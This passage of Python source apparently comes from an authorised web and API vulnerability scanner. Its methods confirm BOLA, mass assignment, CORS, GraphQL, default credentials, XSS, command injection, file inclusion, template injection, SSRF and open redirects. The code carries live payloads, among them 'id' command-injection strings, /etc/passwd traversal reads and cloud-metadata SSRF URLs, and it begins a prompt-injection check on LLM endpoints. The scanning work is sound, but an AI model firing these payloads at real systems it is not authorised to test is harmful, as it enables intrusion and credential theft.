        # requiring a TOKEN shut out every cookie-session application. The question is
        # only whether this request will be authenticated at all.
        if self.browser is None or not (token or self.has_session()):
            return False
        _d, r = self.browser.run(WebAction("request", url=collection_url, method="GET",
                                           headers=({"Authorization": f"Bearer {token}"}
                                                    if token else {})))
        pairs = webmap.objects_with_owners((r.body if r else "") or "")
        if len(pairs) < 2:
            return False
        me = identity or ""
        mine = next((i for i, o in pairs if me and o == me), "")
        theirs = next((i for i, o in pairs if o != (me or o) or (me and o != me)), "")
        if not mine:
            # No object of ours listed: fall back to two objects with DIFFERENT owners,
            # which still tests whether one holder can reach another's.
            owners = {o for _i, o in pairs}
            if len(owners) < 2:
                return False
            first_owner = pairs[0][1]
            mine = pairs[0][0]
            theirs = next((i for i, o in pairs if o != first_owner), "")
        if not theirs or theirs == mine:
            return False
        return self.confirm_bola(item_template, param, mine, theirs, token)

    def confirm_mass_assignment(self, register_url: str, login_url: str,
                                verify_url: str, user_field: str = "username",
                                pass_field: str = "password",
                                extra_fields: dict | None = None) -> bool:
        """Mass assignment / broken object property level authorization (OWASP API3):
        a self-service create accepts a field the client should never control.

        Proved against a CONTROL account. Two accounts are made through the same
        endpoint — one with the privileged field injected, one without — and both are
        then asked what the server thinks they are. Only a difference between them
        confirms: it rules out the field being the default for everyone, which a single
        account cannot distinguish.

        This is the one proof that must WRITE to the target, so it runs only when the
        operator has authorised intrusive actions. It creates two ordinary user accounts
        and nothing else."""
        if self.browser is None or not self.allow_intrusive:
            return False
        from .web import WebAction

        def post_json(url: str, payload: dict):
            _d, r = self.browser.run(WebAction(
                "request", url=url, method="POST", body=json.dumps(payload),
                headers={"Content-Type": "application/json"}))
            return (r.status if r else None), ((r.body if r else "") or "")

        def whoami(username: str, password: str) -> str:
            status, body = post_json(login_url, {user_field: username,
                                                 pass_field: password})
            token = self._extract_token(body) if status else ""
            if not token:
                return ""
            _d, r = self.browser.run(WebAction(
                "request", url=verify_url, method="GET",
                headers={"Authorization": f"Bearer {token}"}))
            return ((r.body if r else "") or "") if r and r.status == 200 else ""

        stamp = random.randint(10 ** 6, 10 ** 7)
        for field, value in self._PRIVILEGE_FIELDS:
            probe_user, control_user = f"brk{stamp}p", f"brk{stamp}c"
            base = {**(extra_fields or {})}
            ok_p, _b = post_json(register_url, {**base, user_field: probe_user,
                                                pass_field: f"Pw1{probe_user}",
                                                "email": f"{probe_user}@example.invalid",
                                                field: value})
            ok_c, _b2 = post_json(register_url, {**base, user_field: control_user,
                                                 pass_field: f"Pw1{control_user}",
                                                 "email": f"{control_user}@example.invalid"})
            if not ok_p or not ok_c:
                stamp += 1
                continue
            probe_view, control_view = whoami(probe_user, f"Pw1{probe_user}"), \
                whoami(control_user, f"Pw1{control_user}")
            if not probe_view or not control_view:
                stamp += 1
                continue
            marker = f'"{field}": {json.dumps(value)}'
            marker_alt = f'"{field}":{json.dumps(value)}'
            got = marker in probe_view or marker_alt in probe_view
            control_has = marker in control_view or marker_alt in control_view
            if got and not control_has:
                self._record_confirmed(
                    verify_url, "Mass assignment of a privileged field", "critical", field,
                    f"registering with {field}={value!r} produced an account the server "
                    f"reports as {field}={value!r}, while a control account created the "
                    f"same way WITHOUT that field does not — the client controls a "
                    f"property it must not",
                    category="api")
                return True
            stamp += 1
        return False

    def confirm_object_mass_assignment(self, url: str, method: str = "PUT",
                                       extra=None) -> bool:
        """Mass assignment on an EXISTING object (crAPI #8/#10): write an INTERNAL field to
        an object we can address, then READ it back — if the field took the value we set and
        did not carry it before, the client controls a server-internal property. Text-marker
        differential like `confirm_mass_assignment`, but against an object rather than a
        signup. Gated on allow_intrusive (it WRITES). Returns True on the first field proved."""
        import json as _json
        from .web import WebAction
        if self.browser is None or not self.allow_intrusive:
            return False

        def get():
            try:
                _d, r = self.browser.run(WebAction("request", url=url, method="GET"))
            except Exception:
                return None, ""
            return (r.status if r else None), ((r.body if r else "") or "")

        def write(payload):
            try:
                _d, r = self.browser.run(WebAction(
                    "request", url=url, method=method, body=_json.dumps(payload),
                    headers={"Content-Type": "application/json"}))
            except Exception:
                return None, ""
            return (r.status if r else None), ((r.body if r else "") or "")

        bs, bb = get()
        if not bs or not (200 <= bs < 300):
            return False
        for field, marker in self._INTERNAL_OBJECT_FIELDS:
            marks = (f'"{field}": {_json.dumps(marker)}', f'"{field}":{_json.dumps(marker)}')
            if any(m in bb for m in marks):
                continue                      # already that value; cannot prove control
            ws, _wb = write({**(extra or {}), field: marker})
            if ws is None or ws >= 500:
                continue
            as_, ab = get()
            if as_ and 200 <= as_ < 300 and any(m in ab for m in marks):
                self._record_confirmed(
                    url, "Mass assignment of an internal object property", "high", field,
                    f"writing {field}={marker!r} to the object made the server report "
                    f"{field}={marker!r} where it did not before — the client controls a "
                    f"server-internal property", category="api")
                return True
        return False

    def confirm_object_mass_assignment_sinks(self) -> int:
        """Fire the object-mass-assignment question at the objects we can address — those the
        ownership ledger recorded as ours (real ids from captured traffic), and confirmed
        object-shaped routes (orders/videos/products/profile). Bounded, allow_intrusive."""
        if self.browser is None or not self.allow_intrusive or self.surface is None:
            return 0
        base = (getattr(self.surface, "seed", "") or f"http://{self.target}/").rstrip("/")
        urls, seen = [], set()
        # Ledger-recorded object URLs (captured, ours) rank first — a real, writable object.
        for rec in (self.principal_identifiers() or {}).get("self", {}).values() \
                if hasattr(self, "principal_identifiers") else []:
            u = rec if isinstance(rec, str) and rec.startswith("http") else ""
            if u and u not in seen:
                seen.add(u)
                urls.append(u)
        hint = ("order", "video", "product", "profile", "vehicle", "cart", "item",
                "account", "post", "comment")
        # An addressable OBJECT to write into, never a create/action verb (`add_vehicle`,
        # `validate-coupon`): mass assignment needs an instance that already exists.
        verb = ("add", "create", "new", "update", "edit", "delete", "remove", "validate",
                "convert", "verify", "resend", "search", "reset", "login", "logout",
                "signup", "register", "refresh", "change", "upload", "bulk", "return")
        for route in list(getattr(self.surface, "confirmed_routes", []) or []):
            if "{" in route or not any(h in route.lower() for h in hint):
                continue
            last = route.rstrip("/").rsplit("/", 1)[-1].lower()
            if any(last.startswith(v) or last == v for v in verb):
                continue
            u = route if route.startswith("http") else base + (
                route if route.startswith("/") else "/" + route)
            if u not in seen:
                seen.add(u)
                urls.append(u)
        confirmed = 0
        for u in urls[:8]:
            if (getattr(self, "_confirm_budget", 1) or 1) <= 0 or self._rate_limited:
                break
            if getattr(self, "_confirm_budget", None) is not None:
                self._confirm_budget -= 1
            for _m in ("PUT", "POST"):
                try:
                    if self.confirm_object_mass_assignment(u, method=_m):
                        confirmed += 1
                        break
                except Exception:
                    continue
        return confirmed

    def confirm_data_exposure(self, url: str) -> bool:
        """Sensitive data served to an UNAUTHENTICATED caller (OWASP API3 / A01).

        Read-only and credential-free by construction: our own session is suppressed, so
        a 200 here means anyone on the network can fetch it. Bulk is what separates a
        finding from a feature — one record about the caller is their own profile, the
        same fields across many principals is an exposure — and credentials in the body
        are decisive regardless of volume.

        A host that answers 200 for everything (soft-404) proves nothing, and an endpoint
        whose job is to issue a token is excluded."""
        from . import webmap
        from .web import WebAction
        if self.browser is None:
            return False
        if self.surface is not None and getattr(self.surface, "soft_404", False):
            return False
        if self._ISSUES_TOKENS_RE.search(url or ""):
            return False
        if self._is_destructive_path(url):
            return False        # a GET here may reinitialise or delete; never worth it
        saved_header = getattr(self.browser, "auth_header", "")
        saved_cookies = dict(getattr(self.browser, "_cookies", {}) or {})
        try:
            self.browser.auth_header = ""
            if hasattr(self.browser, "_cookies"):
                self.browser._cookies = {}
            _d, r = self.browser.run(WebAction("request", url=url, method="GET"))
        finally:
            self.browser.auth_header = saved_header
            if hasattr(self.browser, "_cookies"):
                self.browser._cookies = saved_cookies
        if r is None:
            self._note_rate_limit(_d)
            return False
        if r.status != 200:
            return False                       # refused: working as intended
        count, fields, severity = webmap.sensitive_records(r.body or "")
        if not severity:
            return False
        kind = ("credentials" if severity == "critical" else "personal data")
        self._record_confirmed(
            url, f"Unauthenticated exposure of {kind}", severity, "",
            f"an anonymous GET returned {count} record(s) carrying "
            f"{', '.join(fields)} — no credential of any kind was presented",
            category="api")
        return True

    def confirm_cors(self, url: str) -> bool:
        """Cross-origin resource sharing that lets any site read authenticated responses.

        The finding is the PAIR, never one header alone. A server may echo an arbitrary
        Origin and it means little; it may answer `*` and that means less, because a
        browser refuses to send credentials to a wildcard. What allows a third-party page
        to read a victim's authenticated data is reflecting an attacker-chosen origin
        AND allowing credentials — so only that combination is claimed, plus the `null`
        variant, which a sandboxed iframe can produce at will.

        Header-only: nothing is written and no credential of ours is spent."""
        from .web import WebAction
        if self.browser is None:
            return False

        def headers_for(origin: str):
            """Response headers, or None when the request never happened. An EMPTY dict
            is a real answer — the host simply sends no CORS headers — and confusing the
            two made the first probe abandon the run before the null variant was tried."""
            _d, r = self.browser.run(WebAction("request", url=url, method="GET",
                                               headers={"Origin": origin}))
            if r is None:
                self._note_rate_limit(_d)
                return None
            return {str(k).lower(): str(v) for k, v in (r.headers or {}).items()}

        for origin, label in ((self._CORS_PROBE_ORIGIN, "an arbitrary origin"),
                              ("null", "the null origin")):
            h = headers_for(origin)
            if h is None:
                return False
            allow = (h.get("access-control-allow-origin") or "").strip()
            creds = (h.get("access-control-allow-credentials") or "").strip().lower()
            if allow != origin or creds != "true":
                continue
            self._record_confirmed(
                url, "CORS allows credentialed reads from any origin", "high", "",
                f"the server echoed {label} ({origin!r}) in Access-Control-Allow-Origin "
                f"AND set Access-Control-Allow-Credentials: true — any site a victim "
                f"visits can read this endpoint's response using the victim's session",
                category="web")
            return True
        return False

    def confirm_graphql_introspection(self, url: str) -> bool:
        """A GraphQL endpoint that hands its entire schema to an anonymous caller.

        Introspection returns every type, field and mutation — including the operations
        no client is meant to call — which turns a black-box API into a documented one
        and is the natural first step of any GraphQL attack.

        The verdict is STRUCTURAL: the response must genuinely contain a __schema with
        types. That matters because the most common target shape here is a single-page
        app that answers 200 with its index.html for every path, and a status-code or
        keyword check would call that a GraphQL server."""
        from . import webmap
        from .web import WebAction
        if self.browser is None:
            return False
        _d, r = self.browser.run(WebAction(
            "request", url=url, method="POST", body=self._INTROSPECTION,
            headers={"Content-Type": "application/json"}))
        if r is None:
            self._note_rate_limit(_d)
            return False
        count, notable = webmap.graphql_schema(r.body or "")
        if count <= 0:
            return False
        detail = (f"; the schema names {', '.join(notable)}" if notable else "")
        self._record_confirmed(
            url, "GraphQL introspection enabled", "medium", "",
            f"an unauthenticated introspection query returned the full schema — "
            f"{count} types{detail}",
            category="api")
        return True

    def confirm_graphql_suggestions(self, url: str,
                                    introspection_open: bool = False) -> bool:
        """Field suggestions rebuild the schema even when introspection is disabled.

        A misspelt field returns "Did you mean ...", and each guess is answered with real
        field names, so the schema can be walked out one error at a time. That makes
        turning introspection off — the usual remediation — insufficient on its own,
        which is the point worth reporting.

        Skipped when introspection is already open: the schema is a single query away
        there, so this adds nothing but noise to the report."""
        from .web import WebAction
        if self.browser is None or introspection_open:
            return False
        # A suggestion is only offered for a name CLOSE to a real one, so an arbitrary
        # nonsense field ("brukalNoSuchField") provokes nothing and the check quietly
        # never fires. These are one edit away from the root fields APIs actually ship,
        # and every unknown field in a query produces its own error — so a single request
        # buys a dozen chances.
        probes = ("usr", "userr", "acount", "pastse", "prodcut", "ordr", "serch",
                  "nodee", "mee", "logn", "acccount", "custmer")
        query = "{ " + " ".join("%s { id }" % t for t in probes) + " }"
        _d, r = self.browser.run(WebAction(
            "request", url=url, method="POST",
            body=json.dumps({"query": query}),
            headers={"Content-Type": "application/json"}))
        if r is None:
            self._note_rate_limit(_d)
            return False
        body = r.body or ""
        m = self._SUGGESTION_RE.search(body)
        if not m or (m.group(1) or "") in probes:
            return False        # it only echoed our own guess back
        self._record_confirmed(
            url, "GraphQL field suggestions leak the schema", "medium", "",
            f"an unknown field produced a suggestion naming a real one ({m.group(1)!r}) — "
            f"the schema can be reconstructed one error at a time, so disabling "
            f"introspection alone does not conceal it",
            category="api")
        return True

    def confirm_graphql_batching(self, url: str) -> bool:
        """Query batching: many operations carried by ONE HTTP request.

        Anything counted per request — rate limits, lockout thresholds, WAF rules — is
        measured on the wrong unit, so a single request can carry thousands of login
        attempts. Confirmed structurally: the response must be an ARRAY answering every
        query sent, not merely a 200."""
        from .web import WebAction
        if self.browser is None:
            return False
        batch = [{"query": "{__typename}"}, {"query": "{__typename}"},
                 {"query": "{__typename}"}]
        _d, r = self.browser.run(WebAction(
            "request", url=url, method="POST", body=json.dumps(batch),
            headers={"Content-Type": "application/json"}))
        if r is None:
            self._note_rate_limit(_d)
            return False
        try:
            doc = json.loads(r.body or "")
        except Exception:
            return False
        if not isinstance(doc, list) or len(doc) != len(batch):
            return False
        if not all(isinstance(item, dict) and ("data" in item or "errors" in item)
                   for item in doc):
            return False
        self._record_confirmed(
            url, "GraphQL query batching enabled", "medium", "",
            f"one HTTP request carrying {len(batch)} operations was answered with "
            f"{len(doc)} results — any control counted per request (rate limit, lockout, "
            f"WAF rule) is measuring the wrong unit",
            category="api")
        return True

    def graphql_endpoints(self) -> list[str]:
        """Candidate GraphQL URLs: anything the crawl mined that looks like one, plus the
        conventional paths on the seed host."""
        from urllib.parse import urljoin
        base = (getattr(self.surface, "seed", "") or f"http://{self.target}/")
        found: list[str] = []
        for route in list(getattr(self.surface, "api_routes", None) or []):
            if "graphql" in route.lower() or route.lower().endswith("/gql"):
                found.append(route if route.startswith("http") else urljoin(base, route))
        for path in self._GRAPHQL_PATHS:
            u = urljoin(base, path.lstrip("/"))
            if u not in found:
                found.append(u)
        return found[:8]

    def confirm_default_credentials(self, login_url: str, login_type: str = "form",
                                    user_field: str = "username",
                                    pass_field: str = "password") -> bool:
        """Shipped credentials that were never changed (CWE-1392).

        A comparative benchmark against nuclei found a critical default login on a target
        Brukal walked straight past, which is what prompted this: it is the most common
        route to initial access in the real world and no amount of injection testing
        substitutes for it.

        Proved against a CONTROL. A wrong password for the same account must FAIL first —
        otherwise an application that accepts anything, or one whose login always
        redirects, would report every pair as a success. Only then are the defaults
        tried, and the first that authenticates is the finding.

        Gated on intrusive authorisation because failed logins can lock a real account,
        and bounded to a dozen documented pairs: this asks whether the default was
        changed, it is not a password-guessing attack."""
        if self.browser is None or not self.allow_intrusive:
            return False

        def attempt(user: str, password: str) -> bool:
            # One implementation of "act as somebody else". This used to hand-roll the
            # save/restore and, like the original _separate_identity, it forgot
            # `identity` — so a default credential that worked would silently rename us
            # to admin, and every later check asking whose objects are ours would reason
            # about the wrong account. A second copy of a rule is a second place for it
            # to be wrong.
            with self._separate_identity():
                try:
                    return bool(self.login(login_url, user, password,
                                           login_type=login_type,
                                           user_field=user_field, pass_field=pass_field))
                except Exception:
                    return False

        control_user = self.DEFAULT_CREDENTIALS[0][0]
        if attempt(control_user, f"brukalControl{random.randint(10 ** 6, 10 ** 7)}"):
            return False        # it accepts anything: a default pair would prove nothing

        for user, password in self.DEFAULT_CREDENTIALS:
            if not attempt(user, password):
                continue
            self._record_confirmed(
                login_url, "Default credentials accepted", "critical", user_field,
                f"the shipped credentials {user!r}/{password!r} authenticate, while a "
                f"wrong password for the same account is rejected — the documented "
                f"default was never changed",
                category="web")
            return True
        return False

    def confirm_security_headers(self, url: str) -> int:
        """Transport and browser-side controls that are absent from a real response.

        Included because a comparison against nuclei and nikto showed them reporting
        14-21 hygiene items per target where Brukal reported none — a client expects
        these in a report even though none is a vulnerability on its own.

        Kept honest in two ways: severity stays low, so hygiene can never crowd out a
        proven critical; and the verdict is a fact rather than a guess — the header was
        either present in an observed response or it was not. HSTS is only asked of an
        https origin, since demanding it of http is meaningless."""
        from urllib.parse import urlsplit

        from .web import WebAction
        if self.browser is None:
            return 0
        _d, r = self.browser.run(WebAction("request", url=url, method="GET"))
        if r is None:
            self._note_rate_limit(_d)
            return 0
        if r.status is None or r.status >= 500:
            return 0                      # a broken response says nothing about policy
        headers = {str(k).lower(): str(v) for k, v in (r.headers or {}).items()}
        is_https = urlsplit(url).scheme == "https"
        csp = headers.get("content-security-policy", "")
        n = 0
        for header, severity, meaning in self._SECURITY_HEADERS:
            if header in headers:
                continue
            if header == "strict-transport-security" and not is_https:
                continue
            if header == "x-frame-options" and "frame-ancestors" in csp:
                continue                  # CSP covers it; reporting both is noise
            self._record_confirmed(url, f"Missing security header: {header}", severity,
                                   "", meaning, category="web")
            n += 1
        # Cookie flags, read from the response that set them.
        raw_cookie = headers.get("set-cookie", "")
        if raw_cookie:
            low = raw_cookie.lower()
            for flag, severity, meaning in (
                ("httponly", "low",
                 "a session cookie is readable by JavaScript, so an XSS becomes a "
                 "session theft"),
                ("samesite", "low",
                 "no SameSite, so the cookie rides cross-site requests (CSRF)"),
            ):
                if flag not in low:
                    self._record_confirmed(
                        url, f"Cookie set without {flag}", severity, "", meaning,
                        category="web")
                    n += 1
            if is_https and "secure" not in low:
                self._record_confirmed(
                    url, "Cookie set without Secure", "low", "",
                    "the cookie may be sent over plaintext http", category="web")
                n += 1
        return n

    def confirm_xss(self, url: str, param: str, method: str = "GET", extra=None) -> bool:
        """Reflected-XSS confirmation: inject a unique marker tag and confirm it comes
        back UNENCODED (a live `<tag>`, not `&lt;tag&gt;`). Deterministic; records a
        CONFIRMED finding. GET query or POST form param; governed."""
        if self.browser is None:
            return False
        marker = "brukalXSS" + str(abs(hash(url + param)) % 100000)
        payload = f"<{marker}>"
        body = self._probe(url, param, payload, method, extra)[0] or ""
        if payload in body:                         # reflected unencoded => executable
            self._record_confirmed(url, "Reflected XSS", "high", param,
                                   f"injected {payload} reflected UNENCODED in the response")
            return True
        return False

    def _probe(self, url: str, param: str, value: str, method: str = "GET",
               extra: dict | None = None):
        """One governed probe request. GET puts the payload in the query; POST sends a
        form body. Returns (body, status, headers) or (None, None, {}). Scope+scheme
        gated; the payload rides the HTTP client, never a shell."""
        from urllib.parse import urlencode

        from .web import WebAction
        if self.browser is None:
            return None, None, {}
        # Bounded active probing: confirm_surface sets a request budget so the reflex
        # can't run away against a real target (each probe is a governed cage request).
        if getattr(self, "_confirm_budget", None) is not None:
            if self._confirm_budget <= 0:
                return None, None, {}
            self._confirm_budget -= 1
        if method.upper() == "PATH":
            # A REST path parameter (/users/v1/{username}) is an injection point like any
            # other, and on modern APIs it is where the object id lives — so IDOR and
            # injection concentrate there. `param` is the placeholder token to replace in
            # the URL; the value is percent-encoded so a payload cannot invent new path
            # segments or a query string.
            from urllib.parse import quote
            act = WebAction("get", url=url.replace(param, quote(value, safe="")))
        elif method.upper() == "JSON-CHAT":
            # The OpenAI-compatible chat contract: the prompt rides a `messages` array,
            # not a flat field. Near-universal now, and a flat body is simply rejected
            # by such an endpoint ("messages must not be empty"), so probing it without
            # this shape produces a false negative rather than a finding.
            import json as _json
            act = WebAction("request", url=url, method="POST",
                            body=_json.dumps({"messages": [{"role": "user",
                                                            "content": value}],
                                              **(extra or {})}),
                            headers={"Content-Type": "application/json"})
        elif method.upper() == "JSON":
            # LLM/chat APIs take a JSON body ({"query": "..."} , {"message": "..."}).
            # Same governed HTTP client — the payload is a JSON string, never a shell arg.
            import json as _json
            act = WebAction("request", url=url, method="POST",
                            body=_json.dumps({param: value, **(extra or {})}),
                            headers={"Content-Type": "application/json"})
        elif method.upper() == "MULTIPART":
            # A file-upload sink is unreachable by every mode above. Express fills
            # `req.files` (and PHP `$_FILES`) ONLY from a part carrying a filename, so a
            # query string or a urlencoded body leaves the collection empty and the
            # handler never sees the payload at all. Measured on DVNA: the identical
            # node-serialize gadget fires as a multipart part and does nothing as a
            # urlencoded field. Deserialization and upload sinks live behind uploads,
            # so without this the detectors run, spend budget, emit a coverage row and
            # are structurally unable to report.
            opts = dict(extra or {})
            filename = opts.pop("_filename", "brukal.json")
            part_type = opts.pop("_content_type", "application/octet-stream")
            boundary = "----brukal%d" % random.randint(10 ** 15, 10 ** 16)
            seg = [f"--{boundary}",
                   f'Content-Disposition: form-data; name="{param}"; '
                   f'filename="{filename}"',
                   f"Content-Type: {part_type}", "", value]
            for _k, _v in opts.items():
                seg += [f"--{boundary}",
                        f'Content-Disposition: form-data; name="{_k}"', "", str(_v)]
            seg += [f"--{boundary}--", ""]
            act = WebAction("request", url=url, method="POST", body="\r\n".join(seg),
                            headers={"Content-Type":
                                     f"multipart/form-data; boundary={boundary}"})
        elif method.upper() == "GET":
            # No parameter name means "fetch this URL as-is" (an endpoint-level check
            # such as the unauthenticated-access probe), not "append an empty param".
            act = WebAction("get",
                            url=self._set_param(url, param, value) if param else url)
        else:
            body = urlencode({param: value, **(extra or {})})
            act = WebAction("request", url=url, method="POST", body=body,
                            headers={"Content-Type": "application/x-www-form-urlencoded"})
        _d, r = self.browser.run(act)
        if r is None:
            self._note_rate_limit(_d)
            return None, None, {}
        return (r.body or ""), r.status, (r.headers or {})

    def confirm_cmdi(self, url: str, param: str, method: str = "GET", extra=None) -> bool:
        """Confirm OS command injection: append an `id` command via the common shell
        separators; a hit is real `uid=…(…) gid=…(…)` output in the response. The
        payload's ';'/'|'/'`'/'$()' are DATA to the target (WEB path, no local shell)."""
        for sep in (";", "|", "&&", "&", "$(", "`", "\n"):
            payload = f"127.0.0.1{sep}id" if sep not in ("$(", "`") else \
                (f"127.0.0.1;$(id)" if sep == "$(" else "127.0.0.1;`id`")
            body, _s, _h = self._probe(url, param, payload, method, extra)
            if body and self._CMDI_RE.search(body):
                m = self._CMDI_RE.search(body)
                self._record_confirmed(url, "OS command injection", "critical", param,
                                       f"payload {payload!r} → {m.group(0)}")
                return True
        return False

    def confirm_lfi(self, url: str, param: str, method: str = "GET", extra=None) -> bool:
        """Confirm local file inclusion / path traversal: read /etc/passwd via several
        traversal/wrapper encodings; a hit is a real passwd line (root:...:0:0:)."""
        for payload in ("/etc/passwd", "../../../../../../etc/passwd",
                        "....//....//....//....//etc/passwd",
                        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
                        "php://filter/convert.base64-encode/resource=/etc/passwd"):
            body, _s, _h = self._probe(url, param, payload, method, extra)
            if body and self._PASSWD_RE.search(body):
                self._record_confirmed(url, "Local file inclusion / path traversal",
                                       "critical", param,
                                       f"payload {payload!r} → /etc/passwd contents leaked")
                return True
        return False

    def confirm_ssti(self, url: str, param: str, method: str = "GET", extra=None) -> bool:
        """Confirm server-side template injection: send a distinctive arithmetic
        expression across engine syntaxes; a hit is the EVALUATED product in the
        response while the literal expression is not (so it's execution, not reflection)."""
        a, b = 31337, 7
        product = str(a * b)                       # 219359 — unlikely to occur by chance
        for tmpl in (f"{{{{{a}*{b}}}}}", f"${{{a}*{b}}}", f"#{{{a}*{b}}}",
                     f"<%= {a}*{b} %>", f"{{{a}*{b}}}"):
            body, _s, _h = self._probe(url, param, tmpl, method, extra)
            if body and product in body and tmpl not in body:
                self._record_confirmed(url, "Server-side template injection", "critical",
                                       param, f"payload {tmpl!r} evaluated to {product}")
                return True
        return False

    def confirm_open_redirect(self, url: str, param: str, method: str = "GET", extra=None) -> bool:
        """Confirm an open redirect: point the parameter at an external host; a hit is a
        3xx Location (or a meta/JS redirect) that sends the browser to that host."""
        mark = "brukal-oob.example"
        for payload in (f"https://{mark}/", f"//{mark}/", f"https:/{mark}"):
            body, status, headers = self._probe(url, param, payload, method, extra)
            loc = (headers.get("Location") or headers.get("location") or "") if headers else ""
            redirect_hdr = status in (301, 302, 303, 307, 308) and mark in loc
            meta_js = bool(body) and (f"url={payload}" in body.lower()
                                      or f'location="{payload}"' in (body or "").lower())
            if redirect_hdr or meta_js:
                self._record_confirmed(url, "Open redirect", "medium", param,
                                       f"payload {payload!r} → redirects to {mark}")
                return True
        return False
    def _refused(self, result, body: str = "") -> bool:
        """Was this request refused? Asked of the APPLICATION first, its prose second.

        The regex below reads the target's own words to make a security decision, which
        is doubly wrong. It is English-only and framework-specific, so it generalises to
        whatever the author had seen — and it takes a hostile target at its word, which
        invariant 1 exists to forbid. A page can say "Access denied" and hand over the
        data anyway, or say nothing and refuse.

        The learned refusal baseline settles it whenever calibration established one.
        The phrase list survives only as the fallback for an uncalibrated run, where
        some signal beats none."""
        profile = getattr(self, "profile", None)
        if profile is not None and result is not None:
            verdict = profile.is_denied(result)
            if verdict is not None:
                return verdict
        return bool(self._AUTHZ_DENY_RE.search(body or ""))

    def confirm_ssrf(self, url: str, param: str, method: str = "GET", extra=None) -> bool:
        """Confirm server-side request forgery IN-BAND: make the server fetch a URL whose
        response carries a definitive marker. Cloud metadata (IMDS) and file:// reads are
        the high-value, deterministic cases (blind SSRF needs an OOB listener). Governed."""
        cases = (
            ("http://169.254.169.254/latest/meta-data/", self._IMDS_RE,
             "SSRF to cloud metadata (IMDS credential theft)", "critical"),
            ("http://metadata.google.internal/computeMetadata/v1/", self._IMDS_RE,
             "SSRF to GCP metadata", "critical"),
            ("file:///etc/passwd", self._PASSWD_RE, "SSRF file read (file:// scheme)", "critical"),
        )
        for payload, rx, label, sev in cases:
            body, _s, _h = self._probe(url, param, payload, method, extra)
            # An endpoint that ECHOES what it was given hands the marker straight back.
            # `computeMetadata` is IN the GCP payload URL, so every form that redisplays
            # a submitted value proved SSRF to Google metadata — a live DVNA run
            # reported two CRITICALs against /app/useredit, on a container that cannot
            # even resolve metadata.google.internal. The same echo defect was found and
            # fixed once already in hypothesis.py; the rule never reached here.
            #
            # So the marker has to survive removal of everything we supplied. What is
            # left is what the SERVER chose to say.
            if body and rx.search(self._without_payload(body, payload)):
                self._record_confirmed(url, label, sev, param,
                                       f"payload {payload!r} fetched by the server")
                return True
        return False

    @staticmethod
    def _without_payload(body: str, payload: str) -> str:
        """The response with our own submitted value removed, in the encodings a server
        may echo it back in. A marker that only appears inside the payload proves the
        application can repeat itself, not that it made a request."""
        from urllib.parse import quote as _q
        out = body or ""
        forms = {payload, _q(payload, safe=""), _q(payload, safe=":/"),
                 (payload or "").replace("&", "&amp;")}
        # Fragments matter as much as the whole: a template may render only the path.
        for piece in list(forms) + [p for p in (payload or "").split("/") if len(p) >= 6]:
            if piece:
                out = out.replace(piece, "")
        return out

    def confirm_idor(self, url: str, param: str, method: str = "GET", extra=None,
                     observed: int | None = None) -> bool:
        """Heuristic IDOR check: a numeric object id, when changed, returns a DIFFERENT
        valid object (200, same template, different content) with no access-control block.
        Recorded as a CANDIDATE (medium) — true IDOR needs the operator to confirm the
        object belongs to another principal; this surfaces the strong signal to verify."""
        import difflib
        from urllib.parse import parse_qsl, urlsplit
        cur = dict(parse_qsl(urlsplit(url).query)).get(param, "")
        if observed is not None:
            n = int(observed)
        else:
            n = int(cur) if cur.isdigit() else 1
        from types import SimpleNamespace as _NS
        base, _s, _h = self._probe(url, param, str(n), method, extra)
        if not base or self._refused(_NS(status=_s, body=base, headers=_h or {}), base):
            return False
        # A BOUNDED neighbourhood, direction-independent, that always includes the
        # boundary. Walking only upward misses a record that sits below the observed id
        # — and the first id in a store is exactly where another principal's row tends
        # to live. Capped so a target answering 200 for every id cannot turn this into
        # an unbounded enumeration; the request budget still applies on top.
        neighbourhood, seen_ids = [], {n}
        for cand in (n + 1, n - 1, 0, 1, n + 2):
            if cand < 0 or cand in seen_ids:
                continue
            seen_ids.add(cand)
            neighbourhood.append(str(cand))
        for nb in neighbourhood[:5]:
            body, _s2, _h2 = self._probe(url, param, nb, method, extra)
            got = _NS(status=_s2, body=body, headers=_h2 or {})
            if not body or self._refused(got, body):
                continue
            # "Enough content to be an object" measured against what THIS app returns
            # for nothing, not against a constant fifty bytes — an app that renders a
            # full template around an empty result answers in kilobytes.
            profile = getattr(self, "profile", None)
            substantive = profile.is_substantive(got) if profile is not None else None
            if substantive is False or (substantive is None and len(body) < 50):
                continue
            if body == base:
                continue
            # The ownership signal decides FIRST, and independently of byte distance: a
            # record naming another principal is the finding, whether the two pages are
            # 99.97% identical (one template, two users) or padded far apart.
            owned_elsewhere, who = self._names_a_different_principal(base, body)
            if owned_elsewhere:
                self._record_candidate(
                    url, "Potential IDOR (unauthorised object access)", "medium", param,
                    f"changing {param}={n}→{nb} returns a record naming a DIFFERENT "
                    f"principal ({who}) with no authz block")
                return True
            # Fallback for records that carry no ownership field at all: the original
            # shape heuristic, unchanged. It cannot fire on a near-identical page, so a
            # nonce-bearing re-fetch of the caller's own record stays silent — which is
            # exactly why the ceiling stays where it is instead of being raised.
            sim = difflib.SequenceMatcher(None, base, body).ratio()
            if 0.3 < sim < 0.98:                       # different object, same page shape
                self._record_candidate(
                    url, "Potential IDOR (unauthorised object access)", "medium", param,
                    f"changing {param}={n}→{nb} returns a different object with no authz block")
                return True
        return False

    def _scan_ai_response(self, url: str, param: str, body: str) -> str:
        """Run the deterministic AI signatures over a model response we obtained through
        the governed browser, recording each hit as an AI finding. Returns the highest
        severity seen ("" if clean)."""
        from . import aiscan
        worst = ""
        order = {"critical": 3, "high": 2, "medium": 1}
        # Scan the REASSEMBLED answer (a streamed secret is split across deltas and would
        # be missed in the raw body) and the raw transport too (the tool-call/function
        # schema only exists there). Deduped by label.
        seen: set[str] = set()
        hits = list(aiscan.scan_ai_output(aiscan.visible_text(body or "")))
        hits += [h for h in aiscan.scan_ai_output(body or "") if h[1] not in
                 {x[1] for x in hits}]
        for sev, label, line in hits:
            if label in seen:
                continue
            seen.add(label)
            confirmed = label in aiscan.CONFIRMED_AI_LABELS
            rec = self._record_confirmed if confirmed else self._record_candidate
            rec(url, label, sev, param, line, category="ai")
            if order.get(sev, 0) > order.get(worst, 0):
                worst = sev
        return worst

    def confirm_prompt_injection(self, url: str, param: str = "message",
                                 method: str = "JSON", extra=None) -> bool:
        """Confirm prompt injection (OWASP LLM01) on an LLM-backed endpoint: send a
        directive the model must not obey, demanding a canary it can only produce by
        PERFORMING the instructed transformation — a value that never appears anywhere in
        the request. The canary coming back is proof the model followed attacker-supplied
